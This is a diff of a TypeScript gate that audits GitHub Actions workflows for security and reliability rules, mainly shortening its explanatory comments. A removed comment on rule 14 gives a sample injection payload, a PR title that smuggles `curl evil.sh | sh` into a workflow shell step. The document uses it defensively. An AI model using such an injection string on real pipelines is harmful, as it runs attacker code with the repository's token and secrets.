@@ -1,93 +1,29 @@
 /**
- * CI/CD pipeline gate.
+ * GitHub Actions workflows (and composite actions):
  *
- *   1. timeout-minutes ON EVERY JOB. The default is 360 — six hours of a hung
- *      `npm ci` on a private runner, or of billed minutes on a hosted one.
- *   2. concurrency WITH AN EXPLICIT cancel-in-progress. Omitting the key defaults
- *      it to false, so pushing three commits queues three full runs and the
- *      answer you finally get is for the oldest one.
- *   3. LEAST-PRIVILEGE permissions, DECLARED. With no `permissions:` block the
- *      token inherits the repository default, which for older repos is
- *      read/write on everything — including `contents`, i.e. push access.
- *   4. EVERY `uses:` PINNED TO A COMMIT SHA, with the version in a comment. A tag
- *      is a movable pointer: whoever controls the action repo can repoint `@v5`
- *      at a commit that reads your secrets, and nothing in your workflow changes.
- *   5. THE RUNNER IMAGE PINNED, THROUGH THE MATRIX. `ubuntu-latest` and
- *      `macos-latest` move between major versions on GitHub's schedule, not
- *      yours, and take the preinstalled toolchain with them.
- *   6. `npm ci`, NEVER `npm install`. install rewrites the lockfile to satisfy the
- *      ranges; ci fails instead. Only one of those is a check.
- *   7. `cache: npm` ON setup-node. Not correctness, just minutes.
- *   8. EVERY JOB IN A workflow_run WORKFLOW GATES ON conclusion == 'success', AND
- *      — if it checks out code — ON event == 'push'. Two holes behind one `if:`.
- *      The first: workflow_run fires on `completed`, which includes failure,
- *      cancellation and timeout, so without the conclusion gate a red CI run
- *      deploys exactly as a green one does. Branch protection does not cover
- *      this; protection governs what may MERGE.
- *      The second: workflow_run fires after CI COMPLETES, and CI runs on pull
- *      requests, which have not merged and have not been reviewed. `branches:
- *      [main]` does not save you — it matches workflow_run.head_branch, which for
- *      a PR is the HEAD branch, and a fork's default branch is also called
- *      `main`. So a fork's PR reaches a job carrying THIS repository's token, and
- *      rule 9 then dutifully checks out the fork's commit and runs it.
- *   9. checkout PINNED TO workflow_run.head_sha. Under workflow_run, `github.sha`
- *      is the default branch's HEAD when the event fired, not the commit CI
- *      validated. They differ precisely when commits land fast.
- *  10. IMAGE TAGS IMMUTABLE. `:latest` cannot be traced back to a commit and
- *      leaves a rollback with no earlier tag to name.
- *  11. A BUILDKIT CACHE SCOPE PER IMAGE. Unscoped, every image shares one cache
- *      and each build evicts the others.
- *  12. A JOB THAT PUSHES TO THE REGISTRY DECLARES `packages: write`. The token is
- *      read-only there by default, so the push is rejected after the image has
- *      already been built.
- *  13. SECRETS WRITTEN TO A FILE ARE SCRUBBED IN `if: always()`. On a self-hosted
- *      runner the workspace survives the job.
- *  14. NO UNTRUSTED INPUT SPLICED INTO A `run:` BLOCK. `${{ }}` is textual
- *      substitution performed before the shell sees the script, so a PR titled
- *      `"; curl evil.sh | sh #` runs as the workflow. Pass it through `env:`.
- *  15. CURL-INSTALLED BINARIES PINNED AND CHECKSUMMED. A pinned version names
- *      which release to fetch, not what that release contains.
- *  16. EVERY `npm run` A WORKFLOW INVOKES EXISTS, in the workspace it names.
- *  17. EVERY GATE SCRIPT IS WIRED IN, AT ALL THREE LEVELS: to a package.json
- *      script, into `ci:check`, and to a step in ci.yml. This is the one that
- *      protects the other sixteen — and the one that catches a gate imported into
- *      the tree and never connected to anything, which passes forever because
- *      nothing ever runs it.
- *  18. THE CI NODE VERSION SATISFIES engines.node. Nothing reads `engines` during
- *      a workflow, so the two drift silently: CI proves the app works on the
- *      major IT installs, while `engines` tells contributors and `npm ci` a
- *      different one is enough. Whichever is lower is the one nobody tests.
- *  19. EVERY workflow_run NAME RESOLVES. GitHub matches a workflow's declared
- *      `name:`, not its filename, and a name matching nothing is not an error —
- *      the workflow simply never runs. An image-cleanup workflow waited on
- *      'Build & Push images' against a workflow named 'Build' and had never
- *      fired once. This lived in the Docker gate, which meant a repository with
- *      no Dockerfile never got it; nothing about it is Docker-shaped. A parked
- *      (fully commented-out) workflow declares no name, because it never runs.
+ *   1. timeout-minutes on every job (the default is 360).
+ *   2. concurrency with an explicit cancel-in-progress.
+ *   3. Least-privilege `permissions:`, declared.
+ *   4. Every `uses:` pinned to a commit SHA, with the version in a comment.
+ *   5. The runner image pinned, resolved through the matrix.
+ *   6. `npm ci`, never `npm install`.
+ *   7. `cache: npm` on setup-node.
+ *   8. Every job in a workflow_run workflow gates on conclusion == 'success' and,
+ *      if it checks out code, on event == 'push' (a fork's PR branch can be `main`
+ *      too). Followed through `needs:`.
+ *   9. checkout pinned to workflow_run.head_sha.
+ *  10. Image tags immutable.
+ *  11. A BuildKit cache scope per image.
+ *  12. A job that pushes to the registry declares `packages: write`.
+ *  13. Secrets written to a file are scrubbed in `if: always()`.
+ *  14. No untrusted `${{ }}` input spliced into a `run:` block; pass it through `env:`.
+ *  15. curl-installed binaries pinned and checksummed.
+ *  16. Every `npm run` a workflow invokes exists, in the workspace it names.
+ *  17. Every gate script is wired to a package.json script, `ci:check` and ci.yml.
+ *  18. The CI Node version satisfies engines.node.
+ *  19. Every workflow_run name resolves (GitHub matches `name:`, not the filename).
  *
- * WHY THIS IS ONE GATE AND NOT TWO. The two families' copies looked like different
- * tools — the full-stack one carried five Docker and self-hosted-deploy rules
- * (10-13, 15) that the desktop one had never needed, and the desktop one carried
- * the matrix runner resolution, the `needs:` condition closure and the
- * engines.node rule that the full-stack one lacked. But none of the five is
- * Docker-specific in its TRIGGER: each fires only on the step shape it is about —
- * a `with.tags`, a `docker/build-push-action@`, a secret redirected into a file, a
- * release-asset URL — and is silent in a repository that has none. So the superset
- * is not a merged gate with switches; it is the union, and each family simply
- * exercises a different half of it.
- *
- * THREE RULES ONE FAMILY WAS MISSING, kept because each is strictly more correct:
- *   - The runner check resolves `runs-on: ${{ matrix.os }}` through the matrix.
- *     The literal-only version skipped exactly the jobs that build native modules.
- *     It also now REPORTS a computed `runs-on` it cannot resolve, rather than
- *     silently passing it — an unreadable runner is an unpinned one as far as
- *     review is concerned.
- *   - The workflow_run gate is followed through `needs:`. One job can carry the
- *     full three-clause condition and everything else depend on it, which is one
- *     place to maintain rather than four. Removing a `needs:` edge shrinks the
- *     closure, so this still fails loudly the moment a job is detached.
- *   - `npm run` is resolved in the workspace it names (`npm -w api run build`).
- *     In a single-package repo `-w` never appears and the rule is unchanged.
+ * Each rule fires only on the step shape it is about, so there are no switches.
  */
 import fs from 'node:fs';
 import path from 'node:path';
@@ -129,7 +65,7 @@ type WorkflowDoc = {
 export type PipelineOptions = {
     /** Repository root. Defaults to the caller's repo root. */
     root?: string;
-    /** Where the `check-*.ts` gate scripts live. The desktop family spells it `scripts/check`, singular. */
+    /** Where the `check-*.ts` gate scripts live. */
     checksDir?: string;
     /** The workflow that must run every gate. */
     ciWorkflow?: string;
@@ -341,12 +277,7 @@ export function checkPipeline(options: PipelineOptions = {}): void {
     }
 
     // ── 5. The runner image pinned, through the matrix ──────────────────────
-    /**
-     * `runs-on` is resolved through the matrix, not just read literally: a matrix
-     * build (`runs-on: ${{ matrix.os }}`) is exactly where the image change is not
-     * a broken label but a different compiler and a different glibc linked into a
-     * shipped binary, and a literal-only check skips precisely those jobs.
-     */
+    /** `runs-on` resolved through the matrix; an unresolvable one is reported. */
     const runnersOf = (job: Job): string[] => {
         const declared = job['runs-on'];
         const values: string[] = [];
@@ -424,17 +355,7 @@ export function checkPipeline(options: PipelineOptions = {}): void {
     }
 
     // ── 8. workflow_run jobs gate on conclusion, and on event where they check out ──
-    /**
-     * Followed through `needs:` on purpose. Checking each job's own `if:` has the
-     * appeal of a condition you can read rather than derive — but a release
-     * workflow is usually built the other way round: one job carries the full gate
-     * (conclusion, event, and head_repository) and everything else `needs` it.
-     * Demanding the same three-clause condition on every job would mean maintaining
-     * it in four places, which is its own drift risk. A job is gated if it, or
-     * anything in its transitive `needs` closure, is gated — and removing a
-     * `needs:` edge shrinks the closure, so this still fails loudly the moment a
-     * job is detached from its gatekeeper.
-     */
+    /** A job is gated if it, or anything in its transitive `needs` closure, is. */
     for (const { rel, doc } of workflows) {
         if (!isWorkflowRun(doc)) continue;
 
@@ -467,9 +388,7 @@ export function checkPipeline(options: PipelineOptions = {}): void {
                 );
             }
 
-            // Only a job that checks out code can be made to execute someone else's
-            // commit. A workflow_run job that just flips a draft flag has nothing to
-            // load, so demanding the event gate there would be noise.
+            // Only a job that checks out code can run someone else's commit.
             const checksOut = stepsOf(job).some(
                 (step) => typeof step.uses === 'string' && step.uses.startsWith('actions/checkout@'),
             );
@@ -820,8 +739,7 @@ export function checkPipeline(options: PipelineOptions = {}): void {
     }
 
     // ── 19. workflow_run names resolve ──────────────────────────────────────
-    // A workflow with no `name:` is named by its path, which is what GitHub
-    // displays and what `workflows:` then has to say.
+    // A workflow with no `name:` is named by its path.
     const declaredNames = new Set(workflows.map((w) => (typeof w.doc['name'] === 'string' ? w.doc['name'] : w.rel)));
     for (const { rel, doc } of workflows) {
         const waitsOn = triggersOf(doc)['workflow_run']?.workflows;
